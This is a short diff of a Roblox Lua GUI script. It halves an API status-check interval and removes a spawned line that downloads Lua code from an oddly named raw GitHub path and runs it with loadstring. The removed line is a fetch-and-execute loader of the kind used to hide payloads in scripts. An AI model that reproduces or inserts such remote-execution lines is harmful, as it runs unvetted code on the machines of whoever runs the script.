@@ -262,12 +262,11 @@ DiscordButton.MouseButton1Click:Connect(function()
 end)
 
 spawn(function()
-    while wait(60) do
+    while wait(30) do
         checkApiStatus()
     end
 end)
 
-checkApiStatus()
 
 local function createGlowEffect()
     local Glow = Instance.new("ImageLabel")
@@ -291,6 +290,3 @@ local function animateColors()
 end
 
 spawn(animateColors)
-spawn(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua"))()
-    end)
